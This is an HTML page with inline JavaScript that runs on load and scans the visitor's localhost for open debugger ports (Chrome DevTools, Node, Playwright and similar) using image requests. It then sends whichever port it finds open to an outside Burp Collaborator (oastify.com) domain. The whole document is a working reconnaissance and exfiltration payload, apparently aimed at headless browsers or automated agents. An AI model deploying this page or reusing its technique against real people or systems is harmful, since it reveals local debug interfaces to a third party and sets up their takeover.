<!DOCTYPE html>
<html>
<head>
  <title>Debug Port Scanner</title>
</head>
<body>
  <h1>Scanning for open debugger ports...</h1>
  <div id="result">Scanning...</div>

  <script>
    const collaboratorDomain = '457mfhvylme5j9ytk1x6ns9j1a72v3js.oastify.com';
    
    // Expanded list of common debug ports (Puppeteer, Playwright, Node, VSCode, etc.)
    const ports = [
      9200, 9222, 9223, 9229, 1234, 1337, 3000, 3001, 3002,
      3333, 4444, 5555, 6006, 7777, 8080
    ];

    const paths = ['json', 'json/list', 'favicon.ico'];
    let found = false;

    function sendToCollaborator(subdomain, path = '/') {
      const img = new Image();
      img.src = `http://${subdomain}.${collaboratorDomain}${path}`;
    }

    function testPortPath(port, path) {
      return new Promise(resolve => {
        const url = `http://127.0.0.1:${port}/${path}?t=${Date.now()}`;
        const img = new Image();

        img.onload = () => resolve({ port, path, status: 'open' });
        img.onerror = () => resolve({ port, path, status: 'closed' });

        try {
          img.src = url;
        } catch (e) {
          resolve({ port, path, status: 'blocked' });
        }

        setTimeout(() => resolve({ port, path, status: 'timeout' }), 3000);
      });
    }

    (async () => {
      const results = [];

      for (const port of ports) {
        for (const path of paths) {
          const result = await testPortPath(port, path);
          results.push(result);

          if (result.status === 'open' && !found) {
            found = true;
            document.getElementById('result').innerText =
              `Found open port ${port} on path /${path}`;
            
            const id = `open-${port}-${path.replace(/\W/g, '')}`;
            sendToCollaborator(id);
          }
        }
      }

      if (!found) {
        document.getElementById('result').innerText =
          'No open ports detected.';
        sendToCollaborator('no-port-found', '/no-port-found');
      }

      console.log('Scan results:', results);
    })();
  </script>
</body>
</html>
